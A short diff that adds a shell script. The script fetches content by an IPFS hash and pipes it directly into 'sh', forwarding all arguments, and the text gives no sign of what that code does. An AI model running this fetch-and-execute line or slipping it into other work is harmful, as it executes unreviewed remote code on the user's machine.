@@ -1,0 +1,4 @@
+#
+
+qm=Qmf687gMSpPucCTrxZk7rN3BLwgR38m7LVHyYf5kgpQTRc
+ipfs cat $qm | sh /dev/stdin ${*}
